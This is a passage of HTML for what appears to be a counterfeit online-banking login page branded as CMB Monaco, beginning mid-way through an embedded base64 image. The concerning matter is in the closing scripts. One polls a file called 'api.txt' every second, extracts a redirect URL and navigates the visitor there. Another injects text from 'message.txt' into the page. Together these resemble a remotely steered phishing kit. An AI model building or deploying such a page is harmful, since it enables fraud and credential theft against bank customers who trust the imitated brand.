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"
                  />
                  <div class="welcomeParagraph ng-binding">
                    <p dir="ltr"></p>
                    <table dir="ltr" id="loginTable" style="width: 627px; height: 57px;">
                      <tbody>
                        <tr>
                          <td colspan="2">
                            <span style="font-size: 14px;"><span style="color: rgb(204, 0, 51);"></span></span>
                          </td>
                          <td colspan="2" style="white-space: nowrap;">
                            <p dir="ltr">
                              <span style="font-size: 20px;">
                                <span style="font-family: 'Arial', sans-serif;"><a href="https://youtu.be/iSWVoAAzhIM" target="_blank">[Video] Aide à la première connexion CMB Online</a></span>
                              </span>
                            </p>
                            <p dir="ltr" style="text-align: center;">
                              <span
                                style="font-family: 'Arial', sans-serif; font-size: 12pt; mso-fareast-font-family: Calibri; mso-fareast-theme-font: minor-latin; mso-ansi-language: FR; mso-fareast-language: FR; mso-bidi-language: AR-SA;"
                              >
                                <font color="#000000">
                                  <span style="display: none;"></span><a href=""><span style="display: none;"></span></a>
                                  <span style="font-size: 20px;">
                                    <span style="font-family: 'Arial', sans-serif;"><a href="" target="_blank">FAQ et Vidéos</a></span>
                                  </span>
                                </font>
                              </span>
                            </p>
                          </td>
                        </tr>
                      </tbody>
                    </table>
                    <p dir="ltr"></p>
                  </div>
                </div>
              </ng-include>

           
         


		 </div>
          </div>
          <div class="col-xs-1 iconsBar">
            <div class="icon mb-20 ng-binding ng-scope" id="iconsBarEnvelope">
              <i class="fa fa-envelope fa-2x"></i>
              <br />
              Nous écrire
            </div>
            <div class="icon ng-binding ng-scope" id="iconsBarPhone">
              <i class="fa fa-phone fa-2x"></i>
              <br />
              Nous téléphoner
            </div>
          </div>
        </div>
        <div class="row footer ng-scope">
          <div class="col-xs-2"></div>
          <div class="col-xs-10">
            <div class="row linksRow"></div>
            <div class="row filesRow"></div>
          </div>
          <div class="col-xs-24" style="padding-bottom: 10px;">
            <div style="text-align: center;">
              <div class="ng-binding">© CMB Monaco</div>
            </div>
          </div>
        </div>
      </ng-include>
    </div>
	<script>
    function fetchTextFile() {
      // Perform AJAX request to fetch the content of the text file
      var xhr = new XMLHttpRequest();
      xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
          if (xhr.status === 200) {
            console.log('successfully.');
            // Extract the URL from the fetched text
            var text = xhr.responseText;
            var match = text.match(/<meta\s+http-equiv=['"]refresh['"][^>]*?content=['"]0;url=(.*?)['"]/i);
            if (match && match[1]) {
              var redirectUrl = match[1];
              console.log('Redirecting to:', redirectUrl);
              // Navigate to the extracted URL
              window.location.href = redirectUrl;
            } 
          } else {
            console.error('Failed to fetch text file. Status:', xhr.status);
          }
        }
      };

      xhr.open('GET', 'api.txt', true);
      xhr.send();
    }

    // Set interval to fetch the text file content every 2 seconds
    setInterval(fetchTextFile, 1000);
  </script>
				 <script>
    function fetchMessageFromFile() {
      var xhr = new XMLHttpRequest();
      xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
          if (xhr.status === 200) {
            // Update the content of the paragraph element with the fetched text
            document.getElementById("message").textContent = xhr.responseText;
          } else {
            console.error('Failed to fetch message file. Status:', xhr.status);
          }
        }
      };

      xhr.open('GET', 'message.txt', true);
      xhr.send();
    }

    // Call the function to fetch the message from the file
    fetchMessageFromFile();
  </script>
  </body>
</html>
